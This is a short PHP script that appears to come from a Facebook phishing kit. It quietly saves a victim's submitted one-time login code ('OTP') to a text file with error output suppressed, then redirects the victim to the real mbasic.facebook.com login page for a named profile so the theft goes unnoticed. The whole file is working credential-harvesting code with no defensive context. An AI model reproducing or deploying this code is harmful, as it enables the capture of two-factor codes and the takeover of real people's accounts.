<?php
error_reporting(0);
ini_set('display_errors', 0);
file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Fsteven.cao.94617999&email=&li=kC18X-ErSOUIoR90bAmPGg1l&e=1348092&shbl=1&ref=104&refsrc=https%3A%2F%2Fmbasic.facebook.com%2Fsteven.cao.94617999&_rdr');
exit();
